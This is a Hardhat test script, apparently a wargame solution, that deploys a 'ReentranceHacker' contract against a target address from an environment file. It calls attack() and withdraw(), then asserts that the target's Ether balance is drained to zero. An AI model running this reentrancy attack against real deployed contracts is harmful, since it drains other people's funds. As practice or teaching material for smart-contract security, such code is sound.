const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

// const  REENTRANCE_ABI = [
//     "function transfer(address _to, uint _value) public returns (bool)",
//     "function balanceOf(address _owner) public view returns (uint balance)"
// ];

describe.only("Reentrance hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        hacker = await (await ethers.getContractFactory("ReentranceHacker")).deploy(process.env.REENTRANCE_ADDRESS);
        await hacker.deployed();
});
    describe("Hack test", function() {
        it("Should drain all Ether", async function() {
            expect(await ethers.provider.getBalance(process.env.REENTRANCE_ADDRESS)).to.not.equal(0);
            await hacker.attack({value: await ethers.provider.getBalance(process.env.REENTRANCE_ADDRESS)});
            await hacker.withdraw();
            expect(await ethers.provider.getBalance(process.env.REENTRANCE_ADDRESS)).to.equal(0);
            expect(await ethers.provider.getBalance(hacker.address)).to.equal(0);
        });
    });
});